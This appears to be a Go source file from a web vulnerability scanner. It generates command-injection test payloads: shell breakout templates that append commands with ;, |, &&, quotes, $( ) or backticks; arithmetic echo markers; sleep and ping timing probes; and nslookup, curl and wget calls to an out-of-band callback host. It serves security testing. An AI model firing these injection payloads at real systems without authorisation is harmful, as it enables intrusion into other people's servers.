package infra

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"strconv"
)

// This file holds the shared building blocks for the command-injection module
// family (command_injection_echo / _oast / _timing). Centralising the marker
// generation, the shell-context breakout matrix, and the payload builders keeps
// the three sibling modules consistent and lets the false-positive defenses
// (very-unique arithmetic markers + baseline comparison) be defined once.
//
// Design borrowed from commix's confirmation machinery, adapted to vigolium:
//   - Results-based proof injects an arithmetic expression the shell must
//     *compute* and wraps the computed result in unguessable random delimiters,
//     so a reflection of the literal payload can never satisfy the match.
//   - Payloads are RAW / decoded shell strings. The insertion point's
//     BuildRequest URL-encodes them per parameter type and the target decodes
//     them back before they reach the shell, so a literal `;`, `&`, newline, or
//     space here becomes a real metacharacter at the sink.

// cmdiTagAlphabet is the character set for the random delimiters that wrap the
// arithmetic result. Letters only (no digits): the delimiters then stay
// visually distinct from the numeric sum they bracket, survive URL-encoding,
// `echo`, and HTML rendering unmangled, and carry no character a shell or HTML
// renderer would transform.
const cmdiTagAlphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

// cmdiTagLen is the length of each random delimiter. 14 letters from a 52-char
// alphabet is ~10^24 of entropy per tag — paired with a large random sum and a
// distinct second tag, the needle is astronomically unlikely to appear in any
// real response by coincidence.
const cmdiTagLen = 14

// cmdiOperandMin / cmdiOperandMax bound the random arithmetic operands. An
// 8-digit range makes the sum a large, unusual number (tens of millions) that
// will not collide with incidental page integers like counts, prices, years, or
// IDs — reinforcing that a match means the shell actually evaluated the
// expression. The max sum (~2*10^8) stays well within POSIX shell integer math.
const (
	cmdiOperandMin = 10_000_000
	cmdiOperandMax = 99_999_999
)

// CmdiArithMarker is a single-use, very-unique arithmetic confirmation marker
// for results-based command injection. The injected command prints
// Left + (A+B) + Right; a real shell emits Left + Expected + Right, while a
// server that merely reflects the payload emits the literal `$((A+B))` form
// instead — so the two are never confused. A fresh marker is generated per
// probe (and per confirmation round) so a cached or coincidental response from
// one round can never satisfy the next.
type CmdiArithMarker struct {
	Left     string // random left delimiter
	Right    string // random right delimiter
	A        int    // random operand
	B        int    // random operand
	Expected string // decimal string of A+B — what a real shell computes
}

// cmdiMarkerEntropy is the number of random bytes one marker consumes in a
// single crypto/rand read: the two delimiters plus a 32-bit source per operand.
const cmdiMarkerEntropy = cmdiTagLen*2 + 8

// NewCmdiArithMarker builds a fresh, very-unique arithmetic marker. All of its
// randomness comes from a single crypto/rand read (no per-call syscalls or
// math/big allocation): the first 2*cmdiTagLen bytes become the delimiters and
// the trailing 8 bytes seed the two operands.
func NewCmdiArithMarker() CmdiArithMarker {
	var buf [cmdiMarkerEntropy]byte
	if _, err := rand.Read(buf[:]); err != nil {
		// crypto/rand.Read essentially never fails; if it does, fall back to a
		// deterministic-but-unlikely-to-collide fill rather than panic.
		for i := range buf {
			buf[i] = byte(i*7 + 3)
		}
	}
	span := uint32(cmdiOperandMax - cmdiOperandMin + 1)
	a := cmdiOperandMin + int(binary.BigEndian.Uint32(buf[cmdiTagLen*2:])%span)
	b := cmdiOperandMin + int(binary.BigEndian.Uint32(buf[cmdiTagLen*2+4:])%span)
	return CmdiArithMarker{
		Left:     cmdiTag(buf[0:cmdiTagLen]),
		Right:    cmdiTag(buf[cmdiTagLen : cmdiTagLen*2]),
		A:        a,
		B:        b,
		Expected: strconv.Itoa(a + b),
	}
}

// Needle is the exact string that proves execution: the computed sum bracketed
// by the two unique delimiters. Modules search the response body for this and —
// per the false-positive design — additionally require it to be ABSENT from the
// unpayloaded baseline response.
func (m CmdiArithMarker) Needle() string { return m.Left + m.Expected + m.Right }

// UnixEchoCore prints the marker via POSIX arithmetic expansion:
//
//	echo <Left>$((A+B))<Right>   ->   <Left><sum><Right>
//
// Works in sh/dash/bash. This is the primary technique.
func (m CmdiArithMarker) UnixEchoCore() string {
	return fmt.Sprintf("echo %s$((%d+%d))%s", m.Left, m.A, m.B, m.Right)
}

// UnixExprCore is the `expr`-based fallback for shells/contexts where `$((…))`
// arithmetic expansion is unavailable or filtered:
//
//	echo <Left>$(expr A + B)<Right>
func (m CmdiArithMarker) UnixExprCore() string {
	return fmt.Sprintf("echo %s$(expr %d + %d)%s", m.Left, m.A, m.B, m.Right)
}

// PythonCore covers interpreter / eval-style sinks where a language runtime —
// not a bare shell — evaluates the input:
//
//	python3 -c "print('<Left>'+str(A+B)+'<Right>')"
func (m CmdiArithMarker) PythonCore(interpreter string) string {
	return fmt.Sprintf(`%s -c "print('%s'+str(%d+%d)+'%s')"`, interpreter, m.Left, m.A, m.B, m.Right)
}

// cmdiContextTemplates wraps an injected command core (a `%s`) into the shell
// contexts that break out of a surrounding command string. The fuzzed value is
// the original parameter value with one of these appended, mirroring how a real
// payload rides on top of legitimate input (e.g. "1.2.3.4; echo …").
var cmdiContextTemplates = []struct {
	label    string
	template string
}{
	{"semicolon", ";%s"},
	{"ampersand", "& %s"},
	{"pipe", "| %s"},
	{"logical-or", "|| %s"},
	{"logical-and", "&& %s"},
	{"newline", "\n%s"},
	{"semicolon-term", "; %s ;"},
	{"singlequote-break", "'; %s ;'"},
	{"doublequote-break", "\"; %s ;\""},
	{"cmd-subst", "$(%s)"},
	{"backtick-subst", "`%s`"},
}

// CmdiCandidate is one (breakout context × technique) probe. Core is a builder
// so the module can render the SAME candidate with a fresh marker on the second
// confirmation round.
type CmdiCandidate struct {
	Label    string
	Template string                       // context template containing exactly one %s
	Core     func(CmdiArithMarker) string // technique core builder
}

// Render produces the raw injection string (to be appended to the base value)
// for this candidate using the given marker.
func (c CmdiCandidate) Render(m CmdiArithMarker) string {
	return fmt.Sprintf(c.Template, c.Core(m))
}

// CmdiEchoCandidates returns the curated results-based probe set. The primary
// `echo $((…))` technique is tried across every breakout context; the `expr`
// and interpreter fallbacks are tried only on the most common separators to
// keep request volume bounded while still covering arithmetic-filtered and
// eval-style sinks.
func CmdiEchoCandidates() []CmdiCandidate {
	echoCore := func(m CmdiArithMarker) string { return m.UnixEchoCore() }
	exprCore := func(m CmdiArithMarker) string { return m.UnixExprCore() }
	py3Core := func(m CmdiArithMarker) string { return m.PythonCore("python3") }
	pyCore := func(m CmdiArithMarker) string { return m.PythonCore("python") }

	out := make([]CmdiCandidate, 0, len(cmdiContextTemplates)+4)

	// Primary echo technique across the full breakout matrix.
	for _, ct := range cmdiContextTemplates {
		out = append(out, CmdiCandidate{
			Label:    "echo/" + ct.label,
			Template: ct.template,
			Core:     echoCore,
		})
	}
	// `expr` fallback on the two most common separators.
	out = append(out,
		CmdiCandidate{Label: "expr/semicolon", Template: ";%s", Core: exprCore},
		CmdiCandidate{Label: "expr/pipe", Template: "| %s", Core: exprCore},
	)
	// Interpreter fallback for eval-style sinks (python3 then python).
	out = append(out,
		CmdiCandidate{Label: "python3/semicolon", Template: ";%s", Core: py3Core},
		CmdiCandidate{Label: "python/semicolon", Template: ";%s", Core: pyCore},
	)
	return out
}

// cmdiSleepTemplates are time-based blind payloads carrying a %d for the sleep
// seconds, so the timing module can request different durations and verify the
// observed delay scales with the requested value (the decisive false-positive
// defense). Only commands whose delay is ~linear in the argument are included.
var cmdiSleepTemplates = []struct {
	label    string
	template string // %d = seconds
}{
	{"semicolon-sleep", ";sleep %d"},
	{"pipe-sleep", "|sleep %d"},
	{"logical-and-sleep", "&&sleep %d"},
	{"cmd-subst-sleep", "$(sleep %d)"},
	{"backtick-sleep", "`sleep %d`"},
	// Windows: `ping -n N` sends N echoes ~1s apart (~N-1s wall clock), close
	// enough to linear for the high/low scaling check.
	{"win-ping", "& ping -n %d 127.0.0.1"},
	// Quote-breakout contexts (e.g. `'; sleep N ;'`) are deliberately left to the
	// in-band echo module; for a pure blind-timing oracle the separators and
	// command substitution above already cover the realistic sinks, and each
	// extra template multiplies the multi-second confirmation cost.
}

// CmdiSleepTemplate is a parametric time-based payload.
type CmdiSleepTemplate struct {
	Label    string
	template string
}

// Render returns the payload fragment for the given sleep seconds. seconds==0
// yields the no-delay control variant.
func (t CmdiSleepTemplate) Render(seconds int) string {
	return fmt.Sprintf(t.template, seconds)
}

// CmdiSleepTemplates returns the curated time-based blind payload set.
func CmdiSleepTemplates() []CmdiSleepTemplate {
	out := make([]CmdiSleepTemplate, 0, len(cmdiSleepTemplates))
	for _, st := range cmdiSleepTemplates {
		out = append(out, CmdiSleepTemplate{Label: st.label, template: st.template})
	}
	return out
}

// CmdiOASTPayloads builds out-of-band command-injection payloads that, when
// executed, make the target resolve / fetch a unique OAST domain. `host` is the
// bare callback hostname (as returned by the OAST provider) and `httpURL` is the
// same host with an http:// scheme for fetch-based commands. A clean interaction
// with the per-payload unguessable subdomain is unforgeable proof of execution.
func CmdiOASTPayloads(host, httpURL string) []string {
	return []string{
		";nslookup " + host,
		"|nslookup " + host,
		"&&nslookup " + host,
		"$(nslookup " + host + ")",
		"`nslookup " + host + "`",
		";curl " + httpURL,
		";wget -q -O- " + httpURL,
		";ping -c 1 " + host,  // linux
		"& ping -n 1 " + host, // windows
	}
}

// CmdiOASTHeaderPayloads is the header-safe subset of CmdiOASTPayloads: it omits
// the pipe/newline-bearing forms so the payload can be used as an HTTP header
// value (no CR/LF / header-splitting risk).
func CmdiOASTHeaderPayloads(host, httpURL string) []string {
	return []string{
		";nslookup " + host,
		"$(nslookup " + host + ")",
		"`nslookup " + host + "`",
		";curl " + httpURL,
	}
}

// cmdiTag maps random bytes to a letter-only delimiter from cmdiTagAlphabet.
func cmdiTag(b []byte) string {
	out := make([]byte, len(b))
	for i, x := range b {
		out[i] = cmdiTagAlphabet[int(x)%len(cmdiTagAlphabet)]
	}
	return string(out)
}
